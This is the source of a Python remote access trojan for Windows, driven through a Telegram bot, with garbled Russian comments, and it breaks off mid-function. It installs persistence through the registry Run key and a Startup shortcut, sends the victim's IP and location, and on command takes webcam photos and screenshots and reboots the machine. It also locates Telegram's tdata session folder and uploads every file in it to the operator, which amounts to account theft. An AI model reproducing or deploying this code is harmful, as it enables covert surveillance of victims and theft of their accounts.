import os
import platform
import requests
import pyautogui
import psutil
import telebot
from PIL import ImageGrab, Image
import winreg
import json
import webbrowser  # –ò–º–ø–æ—Ä—Ç–∏—Ä—É–µ–º –º–æ–¥—É–ª—å –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –±—Ä–∞—É–∑–µ—Ä–æ–º
import re  # –ò–º–ø–æ—Ä—Ç–∏—Ä—É–µ–º –º–æ–¥—É–ª—å –¥–ª—è —Ä–µ–≥—É–ª—è—Ä–Ω—ã—Ö –≤—ã—Ä–∞–∂–µ–Ω–∏–π
import ctypes
import win32api
import win32con
import win32gui
import time
import win32process
import pywinauto
import cv2
import numpy as np
from io import BytesIO
import subprocess
import win32com.client
import sys
from moviepy.editor import AudioFileClip
from telebot import TeleBot
import zipfile
import shutil
from pynput.keyboard import Controller, Key
import pyautogui
import sys

# –ö–æ–Ω—Ç—Ä–æ–ª–ª–µ—Ä –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –∫–ª–∞–≤–∏–∞—Ç—É—Ä–æ–π
keyboard_controller = Controller()
#history&hash
import sqlite3
import win32crypt
import asyncio
from Crypto.Cipher import AES
import base64   
import socket
#–ê–í–¢–û –ó–ê–ì–†–£–ó–ö–ê


def create_shortcut(exe_path, shortcut_name):
    # –ü—É—Ç—å –∫ –ø–∞–ø–∫–µ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')

    # –ü—É—Ç—å –∫ —è—Ä–ª—ã–∫—É
    shortcut_path = os.path.join(startup_folder, f'{shortcut_name}.lnk')

    # –°–æ–∑–¥–∞–Ω–∏–µ —è—Ä–ª—ã–∫–∞
    shell = win32com.client.Dispatch('WScript.Shell')
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = exe_path
    shortcut.WorkingDirectory = os.path.dirname(exe_path)
    shortcut.IconLocation = exe_path
    shortcut.save()
# –ù–æ–≤—ã–π —Ä–∞–±–æ—á–∏–π —Å—Ç–æ–ª
def create_virtual_desktop():
    # Using the `ctypes` library to call Windows API for creating a new virtual desktop
    ctypes.windll.user32.SetProcessDPIAware()
    ctypes.windll.shcore.SetProcessDpiAwareness(1)

    # Load the Desktop Manager COM Object
    from win32com.client import Dispatch
    shell = Dispatch("WScript.Shell")
    shell.SendKeys('^{ESC}')  # Open the Start menu
    time.sleep(1)
    shell.SendKeys('^!{D}')  # Open the Task View (Windows Key + Tab)
    time.sleep(1)
    shell.SendKeys('^{D}')  # Create a new desktop (Ctrl + Win + D)

# Move the console window to the new desktop
def move_console_to_new_desktop():
    # Get the handle of the console window
    hwnd = win32gui.GetForegroundWindow()

    # Move the console window to the new desktop
    win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)
    win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)

    # Switch to the new desktop
    ctypes.windll.user32.SwitchDesktop(hwnd)
# –ë–û–¢
TOKEN = ''
USER_ID = ''

# Create a bot instance
bot = telebot.TeleBot(TOKEN)

# –ò–ù–§–ê
def get_system_info():
    try:
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        return {
            'üü¢ COMPUTER ON '
            'INFO '
            'IP': data.get('ip', 'N/A'),
            'City': data.get('city', 'N/A'),
            'Provider': data.get('org', 'N/A'),
            'Coordinates': f"{data.get('loc', 'N/A')}"
        }
    except Exception as e:
        return {'Error': str(e)}

# Send information to the Telegram bot
def send_info_to_telegram(info):
    message = "\n".join([f"{key}: {value}" for key, value in info.items()])
    bot.send_message(USER_ID, message)

# Capture screenshot and save it
def capture_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png')
    return 'screenshot.png'

# Add script to startup
def add_to_startup():
    if platform.system() == 'Windows':
        script_path = os.path.abspath(__file__)
        key = winreg.HKEY_CURRENT_USER
        key_value = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
        with winreg.OpenKey(key, key_value, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, 'MyStartupApp', 0, winreg.REG_SZ, script_path)

# Remove script from startup
def remove_from_startup():
    if platform.system() == 'Windows':
        key = winreg.HKEY_CURRENT_USER
        key_value = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
        try:
            with winreg.OpenKey(key, key_value, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.DeleteValue(reg_key, 'MyStartupApp')
        except FileNotFoundError:
            pass
# –ü–æ–ª—É—á–µ–Ω–∏–µ –ø—É—Ç–∏ –∫ —Ä–∞–±–æ—á–µ–º—É —Å—Ç–æ–ª—É
def get_desktop_path():
    return os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')

# –°–æ–∑–¥–∞–Ω–∏–µ —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ –ø–∞–ø–æ–∫ –Ω–∞ —Ä–∞–±–æ—á–µ–º —Å—Ç–æ–ª–µ
def create_folders_on_desktop(folder_count, folder_name_template):
    desktop_path = get_desktop_path()
    for i in range(1, folder_count + 1):
        folder_name = f"{folder_name_template} {i}"
        folder_path = os.path.join(desktop_path, folder_name)
        if not os.path.exists(folder_path):
            os.mkdir(folder_path)

# –ó–∞–ø–æ–ª–Ω–µ–Ω–∏–µ –≤—Å–µ–≥–æ —Ä–∞–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞ –ø–∞–ø–∫–∞–º–∏
def create_full_desktop_folders(folder_name_template):
    # –ü–æ–ª—É—á–∞–µ–º —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞
    screen_width, screen_height = pyautogui.size()
    
    # –ü—Ä–µ–¥–ø–æ–ª–æ–∂–∏–º, —á—Ç–æ –∫–∞–∂–¥–∞—è –ø–∞–ø–∫–∞ –±—É–¥–µ—Ç –∑–∞–Ω–∏–º–∞—Ç—å 100x100 –ø–∏–∫—Å–µ–ª–µ–π
    folder_icon_size = (100, 100)
    
    # –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–∞–ø–æ–∫, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–∂–Ω–æ —Ä–∞–∑–º–µ—Å—Ç–∏—Ç—å –ø–æ –≥–æ—Ä–∏–∑–æ–Ω—Ç–∞–ª–∏ –∏ –≤–µ—Ä—Ç–∏–∫–∞–ª–∏
    folders_per_row = screen_width // folder_icon_size[0]
    folders_per_column = screen_height // folder_icon_size[1]
    
    # –û–±—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–∞–ø–æ–∫, –∫–æ—Ç–æ—Ä–æ–µ –º–æ–∂–Ω–æ —Ä–∞–∑–º–µ—Å—Ç–∏—Ç—å –Ω–∞ —ç–∫—Ä–∞–Ω–µ
    total_folders = folders_per_row * folders_per_column
    
    create_folders_on_desktop(total_folders, folder_name_template)

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –æ–±–æ–µ–≤ –Ω–∞ —Ä–∞–±–æ—á–∏–π —Å—Ç–æ–ª
def set_wallpaper(image_path):
    # –ü—É—Ç—å –∫ —Ñ–∞–π–ª—É –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
    abs_path = os.path.abspath(image_path)
    
    # –ò—Å–ø–æ–ª—å–∑—É–µ–º —Å–∏—Å—Ç–µ–º–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é –¥–ª—è –∏–∑–º–µ–Ω–µ–Ω–∏—è –æ–±–æ–µ–≤
    ctypes.windll.user32.SystemParametersInfoW(20, 0, abs_path, 3)

# –°–æ–∑–¥–∞–Ω–∏–µ —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–π –Ω–∞ —Ä–∞–±–æ—á–µ–º —Å—Ç–æ–ª–µ
def create_images_on_desktop(image, image_count, image_name_template):
    desktop_path = get_desktop_path()
    for i in range(1, image_count + 1):
        image_name = f"{image_name_template} {i}.png"  # –°–æ—Ö—Ä–∞–Ω—è–µ–º –∫–∞—Ä—Ç–∏–Ω–∫—É –≤ —Ñ–æ—Ä–º–∞—Ç–µ PNG
        image_path = os.path.join(desktop_path, image_name)
        image.save(image_path)

# –ó–∞–ø–æ–ª–Ω–µ–Ω–∏–µ –≤—Å–µ–≥–æ —Ä–∞–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è–º–∏
def create_full_desktop_images(image, image_name_template):
    # –ü–æ–ª—É—á–∞–µ–º —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞
    screen_width, screen_height = pyautogui.size()
    
    # –ü—Ä–µ–¥–ø–æ–ª–æ–∂–∏–º, —á—Ç–æ –∫–∞–∂–¥–∞—è –∫–∞—Ä—Ç–∏–Ω–∫–∞ –±—É–¥–µ—Ç –∑–∞–Ω–∏–º–∞—Ç—å 100x100 –ø–∏–∫—Å–µ–ª–µ–π
    image_icon_size = (100, 100)
    
    # –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –∫–∞—Ä—Ç–∏–Ω–æ–∫, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–∂–Ω–æ —Ä–∞–∑–º–µ—Å—Ç–∏—Ç—å –ø–æ –≥–æ—Ä–∏–∑–æ–Ω—Ç–∞–ª–∏ –∏ –≤–µ—Ä—Ç–∏–∫–∞–ª–∏
    images_per_row = screen_width // image_icon_size[0]
    images_per_column = screen_height // image_icon_size[1]
    
    # –û–±—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∫–∞—Ä—Ç–∏–Ω–æ–∫, –∫–æ—Ç–æ—Ä–æ–µ –º–æ–∂–Ω–æ —Ä–∞–∑–º–µ—Å—Ç–∏—Ç—å –Ω–∞ —ç–∫—Ä–∞–Ω–µ
    total_images = images_per_row * images_per_column
    
    create_images_on_desktop(image, total_images, image_name_template)

# –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –æ–±–æ–µ–≤
def set_wallpaper(image_path):
    # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –æ–±–æ–∏ —Å –ø–æ–º–æ—â—å—é Windows API
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)

# –ü–æ–ª—É—á–µ–Ω–∏–µ –ø—É—Ç–∏ –∫ –ø–∞–ø–∫–µ tdata
def find_telegram_tdata():
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –¥–∏—Å–∫–µ C
    for root, dirs, files in os.walk("C:\\"):
        if "tdata" in dirs:
            return os.path.join(root, "tdata")
    
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –¥–∏—Å–∫–µ D
    for root, dirs, files in os.walk("D:\\"):
        if "tdata" in dirs:
            return os.path.join(root, "tdata")
    
    return None

# –û—Ç–ø—Ä–∞–≤–∫–∞ –ø–∞–ø–∫–∏ tdata –≤ Telegram
def send_tdata_to_telegram():
    tdata_path = find_telegram_tdata()
    
    if tdata_path:
        # –ï—Å–ª–∏ –ø–∞–ø–∫–∞ –Ω–∞–π–¥–µ–Ω–∞, –æ—Ç–ø—Ä–∞–≤–∏–º –µ—ë —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –≤ Telegram
        bot.send_message(USER_ID, f"–ü–∞–ø–∫–∞ tdata –Ω–∞–π–¥–µ–Ω–∞ –ø–æ –ø—É—Ç–∏: {tdata_path}")
        # –ó–∞–¥–∞—á–∞: –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –æ—Ç–ø—Ä–∞–≤–∫—É —Ñ–∞–π–ª–æ–≤ –∏–∑ —ç—Ç–æ–π –ø–∞–ø–∫–∏, –µ—Å–ª–∏ –Ω—É–∂–Ω–æ
        for root, dirs, files in os.walk(tdata_path):
            for file in files:
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as f:
                    bot.send_document(USER_ID, f)
    else:
        bot.send_message(USER_ID, "‚ùå –ü–∞–ø–∫–∞ tdata –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.")


# Handle commands
@bot.message_handler(commands=['start'])
def handle_start(message):
    if message.from_user.id == USER_ID:
        info = get_system_info()
        send_info_to_telegram(info)
        add_to_startup()
    else:
        bot.send_message(message.chat.id, "üí¢–í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã –≤ –±–æ—Ç–µ ;/ –ï—Å–ª–∏ –≤—ã —Ç–æ–∂–µ —Ö–æ—Ç–∏—Ç–µ —Å–µ–±–µ —Ç–∞–∫–æ–≥–æ –±–æ—Ç–∞ —Ç–æ –≤–∞–º –≤ —Ç–≥ - t.me/arkadasoft")

@bot.message_handler(commands=['deskfile'])
def handle_deskfile(message):
    if message.from_user.id == USER_ID:
        # –†–∞–∑–±–∏–≤–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ, —á—Ç–æ–±—ã –∏–∑–≤–ª–µ—á—å –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –∫–æ–º–∞–Ω–¥—ã
        command_parts = message.text.split(' ', 2)
        
        if len(command_parts) < 3:
            bot.send_message(message.chat.id, "üö´ –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /deskfile {–∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∏–ª–∏ 'full'} {–Ω–∞–∑–≤–∞–Ω–∏–µ –ø–∞–ø–æ–∫}")
            return
        
        folder_count_or_full = command_parts[1]
        folder_name_template = command_parts[2]
        
        if folder_count_or_full.lower() == 'full':
            # –ó–∞–ø–æ–ª–Ω–µ–Ω–∏–µ –≤—Å–µ–≥–æ —Ä–∞–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞
            bot.send_message(message.chat.id, "üíæ –ó–∞–ø–æ–ª–Ω—è—é –≤–µ—Å—å —Ä–∞–±–æ—á–∏–π —Å—Ç–æ–ª –ø–∞–ø–∫–∞–º–∏...")
            create_full_desktop_folders(folder_name_template)
            bot.send_message(message.chat.id, "‚úÖ –†–∞–±–æ—á–∏–π —Å—Ç–æ–ª –∑–∞–ø–æ–ª–Ω–µ–Ω –ø–∞–ø–∫–∞–º–∏!")
        else:
            try:
                folder_count = int(folder_count_or_full)
                if folder_count > 0:
                    # –°–æ–∑–¥–∞–Ω–∏–µ —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ –ø–∞–ø–æ–∫
                    bot.send_message(message.chat.id, f"‚åõ –°–æ–∑–¥–∞—é {folder_count} –ø–∞–ø–æ–∫ –Ω–∞ —Ä–∞–±–æ—á–µ–º —Å—Ç–æ–ª–µ...")
                    create_folders_on_desktop(folder_count, folder_name_template)
                    bot.send_message(message.chat.id, f"‚è≥ –°–æ–∑–¥–∞–Ω–æ {folder_count} –ø–∞–ø–æ–∫ –Ω–∞ —Ä–∞–±–æ—á–µ–º —Å—Ç–æ–ª–µ!")
                else:
                    bot.send_message(message.chat.id, "‚ùó –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–∞–ø–æ–∫ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –±–æ–ª—å—à–µ 0.")
            except ValueError:
                bot.send_message(message.chat.id, "‚ùó –£–∫–∞–∂–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–∞–ø–æ–∫ –∏–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–ª—é—á–µ–≤–æ–µ —Å–ª–æ–≤–æ 'full'.")
    else:
        bot.send_message(message.chat.id, "üí¢–í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã –≤ –±–æ—Ç–µ ;/ –ï—Å–ª–∏ –≤—ã —Ç–æ–∂–µ —Ö–æ—Ç–∏—Ç–µ —Å–µ–±–µ —Ç–∞–∫–æ–≥–æ –±–æ—Ç–∞ —Ç–æ –≤–∞–º –≤ —Ç–≥ - t.me/arkadasoft")
# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –ø–æ–∏—Å–∫–∞ –ø–∞–ø–∫–∏ tdata
@bot.message_handler(commands=['tdata'])
def handle_tdata(message):
    if message.from_user.id == USER_ID:
        bot.send_message(message.chat.id, "üîé –ò—â—É –ø–∞–ø–∫—É tdata...")
        send_tdata_to_telegram()
    else:
        bot.send_message(message.chat.id, "üí¢–í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã –≤ –±–æ—Ç–µ ;/ –ï—Å–ª–∏ –≤—ã —Ç–æ–∂–µ —Ö–æ—Ç–∏—Ç–µ —Å–µ–±–µ —Ç–∞–∫–æ–≥–æ –±–æ—Ç–∞ —Ç–æ –≤–∞–º –≤ —Ç–≥ - t.me/arkadasoft")
@bot.message_handler(commands=['setwallpaper'])
def handle_set_wallpaper(message):
    if message.from_user.id == USER_ID:
        bot.send_message(message.chat.id, "üñº –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –Ω–∞ —Ä–∞–±–æ—á–∏–π —Å—Ç–æ–ª.")
    else:
        bot.send_message(message.chat.id, "üí¢–í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã –≤ –±–æ—Ç–µ ;/ –ï—Å–ª–∏ –≤—ã —Ç–æ–∂–µ —Ö–æ—Ç–∏—Ç–µ —Å–µ–±–µ —Ç–∞–∫–æ–≥–æ –±–æ—Ç–∞ —Ç–æ –≤–∞–º –≤ —Ç–≥ - t.me/arkadasoft")

# –û–±—Ä–∞–±–æ—Ç–∫–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è, –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    if message.from_user.id == USER_ID:
        bot.send_message(message.chat.id, "‚åõ –ò–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –ø–æ–ª—É—á–µ–Ω–æ, —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é –æ–±–æ–∏...")
        
        # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ñ–æ—Ç–æ
        file_info = bot.get_file(message.photo[-1].file_id)
        
        # –ó–∞–≥—Ä—É–∂–∞–µ–º —Ñ–∞–π–ª
        downloaded_file = bot.download_file(file_info.file_path)
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ñ–∞–π–ª –ª–æ–∫–∞–ª—å–Ω–æ
        image_path = os.path.join(os.getcwd(), 'wallpaper.jpg')  # –ü—É—Ç—å –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
        with open(image_path, 'wb') as new_file:
            new_file.write(downloaded_file)
        
        # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –æ–±–æ–∏
        set_wallpaper(image_path)
        
        bot.send_message(message.chat.id, "‚úÖ –û–±–æ–∏ —É—Å–ø–µ—à–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã!")
    else:
        bot.send_message(message.chat.id, "üí¢–í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã –≤ –±–æ—Ç–µ ;/ –ï—Å–ª–∏ –≤—ã —Ç–æ–∂–µ —Ö–æ—Ç–∏—Ç–µ —Å–µ–±–µ —Ç–∞–∫–æ–≥–æ –±–æ—Ç–∞ —Ç–æ –≤–∞–º –≤ —Ç–≥ - t.me/arkadasoft")
# –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /deskimage
@bot.message_handler(commands=['deskimage'])
def handle_deskimage(message):
    if message.from_user.id == USER_ID:
        # –†–∞–∑–±–∏–≤–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ, —á—Ç–æ–±—ã –∏–∑–≤–ª–µ—á—å –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –∫–æ–º–∞–Ω–¥—ã
        command_parts = message.text.split(' ', 2)
        
        if len(command_parts) < 3:
            bot.send_message(message.chat.id, "üö´ –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /deskimage {–∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∏–ª–∏ 'full'} {–Ω–∞–∑–≤–∞–Ω–∏–µ –∫–∞—Ä—Ç–∏–Ω–æ–∫}")
            return
        
        image_count_or_full = command_parts[1]
        image_name_template = command_parts[2]
        
        # –û–∂–∏–¥–∞–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        bot.send_message(message.chat.id, "üñº –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –∫–∞—Ä—Ç–∏–Ω–∫—É –¥–ª—è —Ä–∞–∑–º–µ—â–µ–Ω–∏—è –Ω–∞ —Ä–∞–±–æ—á–µ–º —Å—Ç–æ–ª–µ.")
        bot.register_next_step_handler(message, process_image_for_desk, image_count_or_full, image_name_template)
    else:
        bot.send_message(message.chat.id, "üí¢–í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã –≤ –±–æ—Ç–µ ;/ –ï—Å–ª–∏ –≤—ã —Ç–æ–∂–µ —Ö–æ—Ç–∏—Ç–µ —Å–µ–±–µ —Ç–∞–∫–æ–≥–æ –±–æ—Ç–∞ —Ç–æ –≤–∞–º –≤ —Ç–≥ - t.me/arkadasoft")
# –û–±—Ä–∞–±–æ—Ç–∫–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è –¥–ª—è –∫–æ–º–∞–Ω–¥—ã /deskimage
def process_image_for_desk(message, image_count_or_full, image_name_template):
    if message.content_type == 'photo':
        # –ü–æ–ª—É—á–∞–µ–º —Ñ–∞–π–ª –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        image = Image.open(BytesIO(downloaded_file))
        
        # –ï—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤—ã–±—Ä–∞–ª –ø–æ–ª–Ω—ã–π —Ä–∞–±–æ—á–∏–π —Å—Ç–æ–ª
        if image_count_or_full.lower() == 'full':
            bot.send_message(message.chat.id, "‚åõ –ó–∞–ø–æ–ª–Ω—è—é –≤–µ—Å—å —Ä–∞–±–æ—á–∏–π —Å—Ç–æ–ª –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è–º–∏...")
            create_full_desktop_images(image, image_name_template)
            bot.send_message(message.chat.id, "‚úÖ –†–∞–±–æ—á–∏–π —Å—Ç–æ–ª –∑–∞–ø–æ–ª–Ω–µ–Ω –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è–º–∏!")
        else:
            try:
                image_count = int(image_count_or_full)
                if image_count > 0:
                    # –°–æ–∑–¥–∞–Ω–∏–µ —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–π
                    bot.send_message(message.chat.id, f"‚åõ –°–æ–∑–¥–∞—é {image_count} –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–π –Ω–∞ —Ä–∞–±–æ—á–µ–º —Å—Ç–æ–ª–µ...")
                    create_images_on_desktop(image, image_count, image_name_template)
                    bot.send_message(message.chat.id, f"‚è≥ –°–æ–∑–¥–∞–Ω–æ {image_count} –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–π –Ω–∞ —Ä–∞–±–æ—á–µ–º —Å—Ç–æ–ª–µ!")
                else:
                    bot.send_message(message.chat.id, "‚ùó –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–π –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –±–æ–ª—å—à–µ 0.")
            except ValueError:
                bot.send_message(message.chat.id, "‚ùó –£–∫–∞–∂–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–π –∏–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–ª—é—á–µ–≤–æ–µ —Å–ª–æ–≤–æ 'full'.")
    else:
        bot.send_message(message.chat.id, "‚ùó –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –≤ –≤–∏–¥–µ —Ñ–æ—Ç–æ.")

#—Ñ–æ—Ç–æ_—Å_–≤–µ–±–∫–∏
@bot.message_handler(commands=['take_photo'])
def handle_take_photo(message):
    if message.from_user.id == USER_ID:
        bot.send_message(message.chat.id, "üé• –§–æ—Ç–∫–∞—é –í–µ–±–∫—É")
        
        # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∫–∞–º–µ—Ä—ã
        cap = cv2.VideoCapture(0)
        
        # –ó–∞—Ö–≤–∞—Ç –æ–¥–Ω–æ–≥–æ –∫–∞–¥—Ä–∞
        ret, frame = cap.read()
        
        # –û—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏–µ –∫–∞–º–µ—Ä—ã
        cap.release()
        
        if ret:
            # –ö–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è –≤ —Ñ–æ—Ä–º–∞—Ç PNG
            _, buffer = cv2.imencode('.png', frame)
            image_data = BytesIO(buffer)
            
            # –û—Ç–ø—Ä–∞–≤–∫–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è —á–µ—Ä–µ–∑ Telegram
            bot.send_photo(message.chat.id, photo=image_data)
        else:
            bot.send_message(message.chat.id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —Å–¥–µ–ª–∞—Ç—å —Å–Ω–∏–º–æ–∫")
    else:
        bot.send_message(message.chat.id, "üí¢–í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã –≤ –±–æ—Ç–µ ;/ –ï—Å–ª–∏ –≤—ã —Ç–æ–∂–µ —Ö–æ—Ç–∏—Ç–µ —Å–µ–±–µ —Ç–∞–∫–æ–≥–æ –±–æ—Ç–∞ —Ç–æ –≤–∞–º –≤ —Ç–≥ - t.me/arkadasoft")
@bot.message_handler(commands=['screen'])
def handle_screen(message):
    if message.from_user.id == USER_ID:
        screenshot_path = capture_screenshot()
        with open(screenshot_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)
    else:
        bot.send_message(message.chat.id, "üí¢–í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã –≤ –±–æ—Ç–µ ;/ –ï—Å–ª–∏ –≤—ã —Ç–æ–∂–µ —Ö–æ—Ç–∏—Ç–µ —Å–µ–±–µ —Ç–∞–∫–æ–≥–æ –±–æ—Ç–∞ —Ç–æ –≤–∞–º –≤ —Ç–≥ - t.me/arkadasoft")
@bot.message_handler(commands=['restart'])
def handle_restart(message):
    if message.from_user.id == USER_ID:
        bot.send_message(message.chat.id, "üí´ –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫ –ü–ö")
        remove_from_startup()  # –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ —É –≤–∞—Å –µ—Å—Ç—å —Ç–∞–∫–∞—è —Ñ—É–Ω–∫—Ü–∏—è, –∏–ª–∏ —É–¥–∞–ª–∏—Ç–µ —ç—Ç—É —Å—Ç—Ä–æ–∫—É
        os.system('shutdown /r /t 1')
    else:
        bot.send_message(message.chat.id, "üí¢–í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã –≤ –±–æ—Ç–µ ;/ –ï—Å–ª–∏ –≤—ã —Ç–æ–∂–µ —Ö–æ—Ç–∏—Ç–µ —Å–µ–±–µ —Ç–∞–∫–æ–≥–æ –±–æ—Ç–∞ —Ç–æ –≤–∞–º –≤ —Ç–≥ - t.me/arkadasoft")
@bot.message_handler(commands=['close_all'])
def handle_close_all(message):
    if message.from_user.id == USER_ID:
        bot.send_message(message.chat.id, "üí• –ó–∞–∫—Ä—ã—Ç–∏–µ –í—Å–µ—Ö –ü—Ä–æ–≥—Ä–∞–º–º")
